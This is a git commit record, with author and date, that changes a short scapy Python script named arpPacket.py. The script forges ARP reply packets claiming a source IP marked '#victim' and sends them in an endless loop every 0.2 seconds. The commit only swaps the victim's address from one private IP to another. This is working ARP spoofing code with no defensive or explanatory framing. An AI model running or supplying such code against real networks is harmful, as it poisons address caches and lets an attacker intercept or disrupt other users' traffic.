14197e6e0ef7c36fed81ce2aae8e274dfc7d94a4
shekodn <sdiazn19@gmail.com>
2016-11-06 10:26:09 -0600

    adds some .py functionalities

--- arpPacket.py
+++ arpPacket.py
@@ -3,7 +3,7 @@ from scapy.all import *
 
 packet = Ether()/ARP()
 packet.op = 2 #replay
-packet.psrc="192.168.0.100" #victim
+packet.psrc="10.189.15.113" #victim
 sendp(packet, loop =1, inter = .2)
 
 # packet.show()
